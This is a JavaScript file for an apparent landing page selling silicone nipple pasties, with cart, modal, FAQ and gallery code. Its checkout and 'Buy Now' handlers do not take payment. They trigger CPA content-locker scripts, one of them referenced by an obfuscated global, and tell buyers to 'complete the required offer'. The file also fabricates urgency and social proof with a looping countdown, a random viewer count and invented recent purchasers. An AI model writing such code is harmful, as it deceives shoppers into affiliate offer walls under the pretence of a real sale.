// script.js
/*
Purpose: Client-side interactions for Luxe Nipple Pasties landing page
Features: Add to cart simulation, modal handling, smooth scrolling, cart counter
No external dependencies - vanilla JavaScript only
*/

// Cart state
let cartCount = 0;
let cartItems = [];
let isSubmitting = false;

// DOM Elements
let purchaseForm, modal, cartCountElement, quantitySelect, submitButton;
let cartButton, cartSidebar, cartOverlay, cartClose, cartBody, cartItemsContainer, cartFooter, cartTotal;
let checkoutButton, buyNowButton;

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    try {
        initializeDOMElements();
        initializeEventListeners();
        initializeFAQ();
        initializeImageGallery();
        initializeQuantityControls();
        initializeCountdownTimer();
        initializeViewerCount();
        initializeRecentPurchases();
        updateCartDisplay();
    } catch (error) {
        console.error('Initialization error:', error);
        showError('Failed to initialize page. Please refresh.');
    }
});

// Initialize DOM Elements with error handling
function initializeDOMElements() {
    try {
        purchaseForm = document.getElementById('purchaseForm');
        modal = document.getElementById('successModal');
        cartCountElement = document.getElementById('cartCount');
        quantitySelect = document.getElementById('quantity');
        submitButton = document.querySelector('.btn-add-cart');
        
        // Cart elements
        cartButton = document.getElementById('cartButton');
        cartSidebar = document.getElementById('cartSidebar');
        cartOverlay = document.getElementById('cartOverlay');
        cartClose = document.getElementById('cartClose');
        cartBody = document.getElementById('cartBody');
        cartItemsContainer = document.getElementById('cartItems');
        cartFooter = document.getElementById('cartFooter');
        cartTotal = document.getElementById('cartTotal');
        
        // Checkout elements
        checkoutButton = document.getElementById('checkoutButton');
        buyNowButton = document.getElementById('buyNowButton');
    } catch (error) {
        console.error('Error initializing DOM elements:', error);
        throw error;
    }
}

// Event Listeners
function initializeEventListeners() {
    try {
        // Purchase form submission
        if (purchaseForm) {
            purchaseForm.addEventListener('submit', handleAddToCart);
        }
        
        // Cart button click
        if (cartButton) {
            cartButton.addEventListener('click', toggleCart);
        }
        
        // Cart close button
        if (cartClose) {
            cartClose.addEventListener('click', closeCart);
        }
        
        // Cart overlay click
        if (cartOverlay) {
            cartOverlay.addEventListener('click', closeCart);
        }
        
        // Modal close button
        const modalClose = document.querySelector('.modal-close');
        if (modalClose) {
            modalClose.addEventListener('click', closeModal);
        }
        
        // Close modal on outside click
        if (modal) {
            modal.addEventListener('click', function(e) {
                if (e.target === modal) {
                    closeModal();
                }
            });
        }
        
        // Keyboard accessibility for modal and cart
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                if (modal && modal.classList.contains('active')) {
                    closeModal();
                }
                if (cartSidebar && cartSidebar.classList.contains('active')) {
                    closeCart();
                }
            }
        });
        
        // Checkout button
        if (checkoutButton) {
            checkoutButton.addEventListener('click', handleCheckout);
        }
        
        // Buy Now button
        if (buyNowButton) {
            buyNowButton.addEventListener('click', handleBuyNow);
        }
    } catch (error) {
        console.error('Error initializing event listeners:', error);
    }
}

// Form Validation
function validateForm() {
    try {
        if (!quantitySelect) {
            throw new Error('Quantity selector not found');
        }
        
        const quantity = parseInt(quantitySelect.value);
        
        // Validate quantity
        if (isNaN(quantity) || quantity < 1 || quantity > 10) {
            showFormError('Please select a valid quantity (1-10)');
            return false;
        }
        
        return true;
    } catch (error) {
        console.error('Form validation error:', error);
        showFormError('Validation error. Please try again.');
        return false;
    }
}

// Show form error message
function showFormError(message) {
    try {
        // Remove existing error message
        const existingError = document.querySelector('.form-error');
        if (existingError) {
            existingError.remove();
        }
        
        // Create error message element
        const errorDiv = document.createElement('div');
        errorDiv.className = 'form-error';
        errorDiv.textContent = message;
        errorDiv.setAttribute('role', 'alert');
        errorDiv.setAttribute('aria-live', 'polite');
        
        // Insert before submit button
        if (submitButton && submitButton.parentNode) {
            submitButton.parentNode.insertBefore(errorDiv, submitButton);
        }
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            if (errorDiv.parentNode) {
                errorDiv.remove();
            }
        }, 5000);
    } catch (error) {
        console.error('Error showing form error:', error);
    }
}

// Show general error message
function showError(message) {
    try {
        const errorDiv = document.createElement('div');
        errorDiv.className = 'page-error';
        errorDiv.textContent = message;
        errorDiv.style.cssText = 'position: fixed; top: 20px; right: 20px; background: #E74C3C; color: white; padding: 1rem; border-radius: 0.5rem; z-index: 10000;';
        document.body.appendChild(errorDiv);
        
        setTimeout(() => {
            if (errorDiv.parentNode) {
                errorDiv.remove();
            }
        }, 5000);
    } catch (error) {
        console.error('Error showing error message:', error);
    }
}

// Add to Cart Handler with validation and loading state
function handleAddToCart(e) {
    e.preventDefault();
    e.stopPropagation();
    
    // Prevent double submission
    if (isSubmitting) {
        return false;
    }
    
    try {
        // Get current quantity from input
        const qtyInput = document.getElementById('quantity');
        if (!qtyInput) {
            showFormError('Quantity selector not found');
            return false;
        }
        
        const quantity = parseInt(qtyInput.value) || 1;
        
        // Validate quantity
        if (isNaN(quantity) || quantity < 1 || quantity > 10) {
            showFormError('Please select a valid quantity (1-10)');
            return false;
        }
        
        // Set loading state
        setLoadingState(true);
        
        // Simulate API call delay (remove in production)
        setTimeout(() => {
            try {
                // Add item to cart
                addToCart(quantity);
                
                // Open cart sidebar to show added item
                openCart();
                
                // Track conversion (placeholder for analytics)
                trackAddToCart(quantity);
                
                // Reset loading state
                setLoadingState(false);
            } catch (error) {
                console.error('Error processing cart addition:', error);
                showFormError('Failed to add item to cart. Please try again.');
                setLoadingState(false);
            }
        }, 500);
        
    } catch (error) {
        console.error('Error in handleAddToCart:', error);
        showFormError('An error occurred. Please try again.');
        setLoadingState(false);
    }
    
    return false;
}

// Set loading state for submit button
function setLoadingState(loading) {
    try {
        if (!submitButton) return;
        
        isSubmitting = loading;
        
        if (loading) {
            submitButton.disabled = true;
            submitButton.setAttribute('aria-busy', 'true');
            submitButton.textContent = 'Adding to Cart...';
            submitButton.classList.add('loading');
        } else {
            submitButton.disabled = false;
            submitButton.removeAttribute('aria-busy');
            submitButton.textContent = 'Secure Your Pair';
            submitButton.classList.remove('loading');
        }
    } catch (error) {
        console.error('Error setting loading state:', error);
    }
}

// Add to Cart
function addToCart(quantity) {
    try {
        const product = {
            id: 'NP-LUXE-001',
            name: 'Luxe Reusable Silicone Nipple Pasties',
            price: 29.99,
            quantity: quantity,
            image: 'https://via.placeholder.com/80x80/F5F0EB/8B7355?text=Product'
        };
        
        // Check if item already in cart
        const existingItem = cartItems.find(item => item.id === product.id);
        
        if (existingItem) {
            existingItem.quantity += quantity;
        } else {
            cartItems.push(product);
        }
        
        cartCount += quantity;
        updateCartDisplay();
        updateCartItems();
    } catch (error) {
        console.error('Error adding to cart:', error);
    }
}

// Update Cart Display with error handling
function updateCartDisplay() {
    try {
        if (cartCountElement) {
            cartCountElement.textContent = cartCount;
            cartCountElement.setAttribute('aria-label', `${cartCount} items in cart`);
            
            // Show/hide cart count badge
            if (cartCount > 0) {
                cartCountElement.style.display = 'flex';
                // Animation on update
                cartCountElement.style.transform = 'scale(1.3)';
                setTimeout(() => {
                    if (cartCountElement) {
                        cartCountElement.style.transform = 'scale(1)';
                    }
                }, 200);
            } else {
                cartCountElement.style.display = 'none';
            }
        }
    } catch (error) {
        console.error('Error updating cart display:', error);
    }
}

// Update Cart Items Display
function updateCartItems() {
    try {
        const cartEmpty = document.getElementById('cartEmpty');
        
        if (cartItems.length === 0) {
            if (cartEmpty) cartEmpty.style.display = 'flex';
            if (cartItemsContainer) cartItemsContainer.style.display = 'none';
            if (cartFooter) cartFooter.style.display = 'none';
        } else {
            if (cartEmpty) cartEmpty.style.display = 'none';
            if (cartItemsContainer) cartItemsContainer.style.display = 'block';
            if (cartFooter) cartFooter.style.display = 'block';
            
            // Render cart items
            if (cartItemsContainer) {
                cartItemsContainer.innerHTML = cartItems.map((item, index) => `
                    <div class="cart-item" data-item-id="${item.id}">
                        <img src="${item.image}" alt="${item.name}" class="cart-item-image">
                        <div class="cart-item-details">
                            <div class="cart-item-name">${item.name}</div>
                            <div class="cart-item-price">$${item.price.toFixed(2)} each</div>
                            <div class="cart-item-quantity">
                                <button class="cart-item-qty-btn" onclick="updateCartItemQuantity(${index}, -1)">−</button>
                                <input type="number" class="cart-item-qty-input" value="${item.quantity}" min="1" max="10" readonly>
                                <button class="cart-item-qty-btn" onclick="updateCartItemQuantity(${index}, 1)">+</button>
                            </div>
                        </div>
                        <button class="cart-item-remove" onclick="removeCartItem(${index})" aria-label="Remove item">×</button>
                    </div>
                `).join('');
            }
            
            // Update total
            const total = cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);
            if (cartTotal) {
                cartTotal.textContent = `$${total.toFixed(2)}`;
            }
        }
    } catch (error) {
        console.error('Error updating cart items:', error);
    }
}

// Toggle Cart Sidebar
function toggleCart() {
    try {
        if (cartSidebar) {
            const isActive = cartSidebar.classList.contains('active');
            if (isActive) {
                closeCart();
            } else {
                openCart();
            }
        }
    } catch (error) {
        console.error('Error toggling cart:', error);
    }
}

// Open Cart
function openCart() {
    try {
        if (cartSidebar) {
            cartSidebar.classList.add('active');
            cartSidebar.setAttribute('aria-hidden', 'false');
            if (cartButton) {
                cartButton.setAttribute('aria-expanded', 'true');
            }
            document.body.style.overflow = 'hidden';
            updateCartItems();
        }
    } catch (error) {
        console.error('Error opening cart:', error);
    }
}

// Close Cart
function closeCart() {
    try {
        if (cartSidebar) {
            cartSidebar.classList.remove('active');
            cartSidebar.setAttribute('aria-hidden', 'true');
            if (cartButton) {
                cartButton.setAttribute('aria-expanded', 'false');
            }
            document.body.style.overflow = '';
        }
    } catch (error) {
        console.error('Error closing cart:', error);
    }
}

// Update Cart Item Quantity
function updateCartItemQuantity(index, change) {
    try {
        if (cartItems[index]) {
            const newQuantity = cartItems[index].quantity + change;
            if (newQuantity < 1) {
                removeCartItem(index);
            } else if (newQuantity <= 10) {
                const quantityChange = change;
                cartItems[index].quantity = newQuantity;
                cartCount += quantityChange;
                updateCartDisplay();
                updateCartItems();
            }
        }
    } catch (error) {
        console.error('Error updating cart item quantity:', error);
    }
}

// Remove Cart Item
function removeCartItem(index) {
    try {
        if (cartItems[index]) {
            cartCount -= cartItems[index].quantity;
            cartItems.splice(index, 1);
            updateCartDisplay();
            updateCartItems();
        }
    } catch (error) {
        console.error('Error removing cart item:', error);
    }
}

// Handle Buy Now - Triggers Content Locker
function handleBuyNow() {
    try {
        // Get current quantity
        const qtyInput = document.getElementById('quantity');
        if (!qtyInput) {
            showFormError('Quantity selector not found');
            return;
        }
        
        const quantity = parseInt(qtyInput.value) || 1;
        
        // Validate quantity
        if (isNaN(quantity) || quantity < 1 || quantity > 10) {
            showFormError('Please select a valid quantity (1-10)');
            return;
        }
        
        // Add to cart first
        addToCart(quantity);
        
        // Immediately proceed to checkout (which triggers locker)
        setTimeout(() => {
            handleCheckout();
        }, 300);
    } catch (error) {
        console.error('Error handling buy now:', error);
        showError('Error processing buy now. Please try again.');
    }
}

// Handle Checkout - Triggers Content Locker
function handleCheckout() {
    try {
        if (cartItems.length === 0) {
            showError('Your cart is empty');
            return;
        }
        
        const total = cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);
        
        // Close cart first
        closeCart();
        
        // Trigger content locker
        // Wait a moment for cart to close, then trigger locker
        setTimeout(() => {
            try {
                // Check if locker functions are available
                if (typeof xfLock === 'function') {
                    xfLock();
                } else if (typeof CPABuildLock === 'function') {
                    CPABuildLock();
                } else if (typeof wHbRF_FgI_vvOjec !== 'undefined') {
                    // Locker script should auto-initialize
                    // Force trigger if needed
                    console.log('Content locker initialized');
                } else {
                    // Fallback: try to trigger locker after script loads
                    console.log('Waiting for content locker to load...');
                    setTimeout(() => {
                        if (typeof xfLock === 'function') {
                            xfLock();
                        } else if (typeof CPABuildLock === 'function') {
                            CPABuildLock();
                        } else {
                            // Final fallback - show error modal
                            showModal();
                            const modalTitle = document.getElementById('modalTitle');
                            const modalContent = document.querySelector('.modal-content p');
                            if (modalTitle) modalTitle.textContent = 'Checkout Required';
                            if (modalContent) modalContent.textContent = `To complete your purchase of $${total.toFixed(2)}, please complete the required offer.`;
                        }
                    }, 1000);
                }
            } catch (error) {
                console.error('Error triggering content locker:', error);
                // Fallback message
                showModal();
                const modalTitle = document.getElementById('modalTitle');
                const modalContent = document.querySelector('.modal-content p');
                if (modalTitle) modalTitle.textContent = 'Proceeding to Checkout';
                if (modalContent) modalContent.textContent = `Your order total is $${total.toFixed(2)}. Please complete the offer to proceed.`;
            }
        }, 300);
        
    } catch (error) {
        console.error('Error handling checkout:', error);
        showError('Error processing checkout. Please try again.');
    }
}

// Make functions globally accessible for onclick handlers
window.toggleCart = toggleCart;
window.openCart = openCart;
window.closeCart = closeCart;
window.updateCartItemQuantity = updateCartItemQuantity;
window.removeCartItem = removeCartItem;

// Modal Functions with error handling
function showModal() {
    try {
        if (modal) {
            modal.classList.add('active');
            modal.setAttribute('aria-hidden', 'false');
            
            // Focus trap
            const focusableElements = modal.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])');
            if (focusableElements.length > 0) {
                focusableElements[0].focus();
            }
            
            // Prevent body scroll
            document.body.style.overflow = 'hidden';
        }
    } catch (error) {
        console.error('Error showing modal:', error);
    }
}

function closeModal() {
    try {
        if (modal) {
            modal.classList.remove('active');
            modal.setAttribute('aria-hidden', 'true');
            
            // Restore body scroll
            document.body.style.overflow = '';
        }
    } catch (error) {
        console.error('Error closing modal:', error);
    }
}

// Smooth Scroll Functions with error handling
function scrollToProduct() {
    try {
        const productSection = document.getElementById('product');
        if (productSection) {
            productSection.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    } catch (error) {
        console.error('Error scrolling to product:', error);
    }
}

function scrollToFeatures() {
    try {
        const featuresSection = document.getElementById('features');
        if (featuresSection) {
            featuresSection.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    } catch (error) {
        console.error('Error scrolling to features:', error);
    }
}

// Initialize FAQ Accordion
function initializeFAQ() {
    try {
        const faqItems = document.querySelectorAll('.faq-item');
        
        if (faqItems.length === 0) {
            return;
        }
        
        faqItems.forEach((item, index) => {
            const question = item.querySelector('.faq-question');
            const answer = item.querySelector('.faq-answer');
            
            if (!question || !answer) {
                return;
            }
            
            // Set initial state
            answer.style.display = 'none';
            answer.setAttribute('aria-hidden', 'true');
            question.setAttribute('aria-expanded', 'false');
            question.setAttribute('role', 'button');
            question.setAttribute('tabindex', '0');
            question.setAttribute('id', `faq-question-${index}`);
            answer.setAttribute('id', `faq-answer-${index}`);
            answer.setAttribute('aria-labelledby', `faq-question-${index}`);
            
            // Add click handler
            question.addEventListener('click', function() {
                toggleFAQ(item, question, answer);
            });
            
            // Add keyboard handler
            question.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    toggleFAQ(item, question, answer);
                }
            });
        });
    } catch (error) {
        console.error('Error initializing FAQ:', error);
    }
}

// Toggle FAQ item
function toggleFAQ(item, question, answer) {
    try {
        const isExpanded = question.getAttribute('aria-expanded') === 'true';
        
        // Close all other FAQ items (optional - remove if you want multiple open)
        const allFaqItems = document.querySelectorAll('.faq-item');
        allFaqItems.forEach(otherItem => {
            if (otherItem !== item) {
                const otherQuestion = otherItem.querySelector('.faq-question');
                const otherAnswer = otherItem.querySelector('.faq-answer');
                if (otherQuestion && otherAnswer) {
                    otherAnswer.style.display = 'none';
                    otherAnswer.setAttribute('aria-hidden', 'true');
                    otherQuestion.setAttribute('aria-expanded', 'false');
                    otherItem.classList.remove('active');
                }
            }
        });
        
        // Toggle current item
        if (isExpanded) {
            answer.style.display = 'none';
            answer.setAttribute('aria-hidden', 'true');
            question.setAttribute('aria-expanded', 'false');
            item.classList.remove('active');
        } else {
            answer.style.display = 'block';
            answer.setAttribute('aria-hidden', 'false');
            question.setAttribute('aria-expanded', 'true');
            item.classList.add('active');
        }
    } catch (error) {
        console.error('Error toggling FAQ:', error);
    }
}

// Analytics Tracking (Placeholder)
function trackAddToCart(quantity) {
    // Placeholder for Google Analytics or other tracking
    console.log('Add to Cart Event:', {
        product: 'Luxe Reusable Silicone Nipple Pasties',
        quantity: quantity,
        price: 29.99,
        currency: 'USD'
    });
    
    /*
    Example Google Analytics 4 implementation:
    
    gtag('event', 'add_to_cart', {
        currency: 'USD',
        value: 29.99 * quantity,
        items: [{
            item_id: 'NP-LUXE-001',
            item_name: 'Luxe Reusable Silicone Nipple Pasties',
            price: 29.99,
            quantity: quantity
        }]
    });
    */
}

// Image Gallery Enhancement with error handling
function initializeImageGallery() {
    try {
        const thumbnails = document.querySelectorAll('.product-thumbnails .thumbnail');
        const mainImage = document.getElementById('mainProductImage');
        
        if (thumbnails.length > 0 && mainImage) {
            thumbnails.forEach(thumb => {
                thumb.addEventListener('click', function() {
                    try {
                        const fullImage = this.getAttribute('data-full') || this.src;
                        if (!fullImage) {
                            throw new Error('Invalid image source');
                        }
                        
                        // Update main image
                        mainImage.src = fullImage;
                        mainImage.alt = this.alt;
                        
                        // Update active state
                        thumbnails.forEach(t => t.classList.remove('active'));
                        this.classList.add('active');
                    } catch (error) {
                        console.error('Error updating main image:', error);
                    }
                });
                
                // Add error handling for image load failures
                thumb.addEventListener('error', function() {
                    console.error('Failed to load thumbnail image:', this.src);
                    this.src = 'https://via.placeholder.com/400x400/F5F0EB/8B7355?text=Image+Error';
                });
            });
            
            // Add zoom functionality
            const imageWrapper = document.querySelector('.product-image-wrapper');
            if (imageWrapper) {
                imageWrapper.addEventListener('click', function() {
                    const fullImage = mainImage.src.replace('w=800&h=800', 'w=1200&h=1200');
                    window.open(fullImage, '_blank');
                });
            }
            
            // Add error handling for main image
            mainImage.addEventListener('error', function() {
                console.error('Failed to load main image:', this.src);
                this.src = 'https://via.placeholder.com/800x800/F5F0EB/8B7355?text=Product+Image';
            });
        }
    } catch (error) {
        console.error('Error initializing image gallery:', error);
    }
}

// Initialize Quantity Controls
function initializeQuantityControls() {
    try {
        const qtyPlus = document.querySelector('.qty-plus');
        const qtyMinus = document.querySelector('.qty-minus');
        const qtyInput = document.getElementById('quantity');
        const qtyOptions = document.querySelectorAll('.qty-option');
        
        // Initialize quantity from active option
        const activeOption = document.querySelector('.qty-option.active');
        if (activeOption && qtyInput) {
            const defaultQty = parseInt(activeOption.getAttribute('data-qty')) || 1;
            qtyInput.value = defaultQty;
        }
        
        if (qtyPlus && qtyMinus && qtyInput) {
            qtyPlus.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                const current = parseInt(qtyInput.value) || 1;
                if (current < 10) {
                    const newQty = current + 1;
                    qtyInput.value = newQty;
                    updateQuantityOptions(newQty);
                }
            });
            
            qtyMinus.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                const current = parseInt(qtyInput.value) || 1;
                if (current > 1) {
                    const newQty = current - 1;
                    qtyInput.value = newQty;
                    updateQuantityOptions(newQty);
                }
            });
        }
        
        if (qtyOptions.length > 0 && qtyInput) {
            qtyOptions.forEach(option => {
                option.addEventListener('click', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    const qty = parseInt(this.getAttribute('data-qty')) || 1;
                    qtyInput.value = qty;
                    updateQuantityOptions(qty);
                });
            });
        }
    } catch (error) {
        console.error('Error initializing quantity controls:', error);
    }
}

// Update Quantity Options Active State
function updateQuantityOptions(quantity) {
    try {
        const qtyOptions = document.querySelectorAll('.qty-option');
        const qtyInput = document.getElementById('quantity');
        
        // Update input value
        if (qtyInput) {
            qtyInput.value = quantity;
        }
        
        // Update active state
        qtyOptions.forEach(option => {
            const qty = parseInt(option.getAttribute('data-qty')) || 1;
            if (qty === quantity) {
                option.classList.add('active');
            } else {
                option.classList.remove('active');
            }
        });
    } catch (error) {
        console.error('Error updating quantity options:', error);
    }
}

// Initialize Countdown Timer
function initializeCountdownTimer() {
    try {
        const countdownElement = document.getElementById('countdown');
        if (!countdownElement) return;
        
        // Set countdown to 24 hours from now
        let hours = 23;
        let minutes = 45;
        let seconds = 12;
        
        setInterval(function() {
            seconds--;
            if (seconds < 0) {
                seconds = 59;
                minutes--;
                if (minutes < 0) {
                    minutes = 59;
                    hours--;
                    if (hours < 0) {
                        hours = 23;
                    }
                }
            }
            
            const h = hours.toString().padStart(2, '0');
            const m = minutes.toString().padStart(2, '0');
            const s = seconds.toString().padStart(2, '0');
            countdownElement.textContent = `${h}:${m}:${s}`;
        }, 1000);
    } catch (error) {
        console.error('Error initializing countdown timer:', error);
    }
}

// Initialize Viewer Count
function initializeViewerCount() {
    try {
        const viewerCountElement = document.getElementById('viewerCount');
        if (!viewerCountElement) return;
        
        // Simulate viewer count changes
        setInterval(function() {
            const current = parseInt(viewerCountElement.textContent);
            const change = Math.floor(Math.random() * 3) - 1; // -1, 0, or 1
            const newCount = Math.max(15, Math.min(35, current + change));
            viewerCountElement.textContent = newCount;
        }, 5000);
    } catch (error) {
        console.error('Error initializing viewer count:', error);
    }
}

// Initialize Recent Purchases
function initializeRecentPurchases() {
    try {
        const purchaseList = document.querySelector('.purchase-list');
        if (!purchaseList) return;
        
        const names = ['Sarah M.', 'Jessica K.', 'Amanda R.', 'Emily T.', 'Olivia W.', 'Sophia L.', 'Isabella M.', 'Mia K.'];
        const locations = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego'];
        
        setInterval(function() {
            const randomName = names[Math.floor(Math.random() * names.length)];
            const randomLocation = locations[Math.floor(Math.random() * locations.length)];
            
            const purchaseItem = document.createElement('div');
            purchaseItem.className = 'purchase-item';
            purchaseItem.innerHTML = `
                <span class="purchase-name">${randomName}</span>
                <span class="purchase-location">from ${randomLocation}</span>
                <span class="purchase-time">just now</span>
            `;
            
            purchaseList.insertBefore(purchaseItem, purchaseList.firstChild);
            
            // Remove old items (keep only 2)
            while (purchaseList.children.length > 2) {
                purchaseList.removeChild(purchaseList.lastChild);
            }
        }, 10000); // Add new purchase every 10 seconds
    } catch (error) {
        console.error('Error initializing recent purchases:', error);
    }
}

// Lazy Loading Fallback (for older browsers)
if ('loading' in HTMLImageElement.prototype) {
    // Native lazy loading supported
    console.log('Native lazy loading supported');
} else {
    // Fallback for older browsers
    const images = document.querySelectorAll('img[loading="lazy"]');
    images.forEach(img => {
        img.src = img.dataset.src || img.src;
    });
}

// Performance optimization: Defer non-critical operations
window.addEventListener('load', function() {
    // Any post-load optimizations can go here
    console.log('Page fully loaded');
});
